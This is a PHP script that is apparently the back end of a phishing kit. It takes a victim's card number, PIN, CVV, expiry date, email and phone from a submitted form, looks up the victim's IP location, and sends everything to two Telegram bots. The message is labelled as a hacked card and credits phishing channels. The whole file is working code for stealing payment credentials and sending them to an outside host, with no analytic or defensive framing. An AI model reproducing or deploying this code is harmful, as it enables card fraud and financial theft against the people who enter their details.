<?php


//Just For BankInfo!
include"Bankinfo.php";
$date=strftime("%Y-%m-%d %H:%M:%S",time());

$ip=$_SERVER["REMOTE_ADDR"];


$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;






if($_POST['pan1']){
$pan = $_POST['pan1'];
$pin = $_POST['pin1'];
$cvv = $_POST['cvv21'];
$month = $_POST['month1'];
$year = $_POST['year1'];
$email = $_POST['email'];
$pno = $_POST['phone'];
$ORDER = $_POST['order'];
include"../data/$e.php";
include"../INFO.php";



//BANK INFO
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
//BANK INFO


$Text = "
#ᏟᎪᎡᎠ_ᎻᎪᏟKᎬᎠ😍
➖➖➖➖➖➖➖➖
🔱ᏟᎪᎡᎠ: <code>$pan1 $pan2 $pan3 $pan4</code>
ᏢᎪᏚᏚ2: <code>$pin</code>
🔆ᏟᏙᏙ2: <code>$cvv</code>
📅YᎬᎪᎡ: <code>$year</code>  ᎷᎾNᎢᎻ: <code>$month</code>

| IP : $ip | ISP : $isp | REGION NAME : $regionName | REGION : $region |
➖➖➖➖➖➖➖➖
 Code By : @SunPhish
 Channel : @anabel_phishing
 Channel : @Panda_Phish
$bankinfo[0]";


		$FuckIT =  file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
		 $FuckIT = file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));


//Send To User




}else{
    echo "You Don't Have Permision.";
}

   //CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please

?>

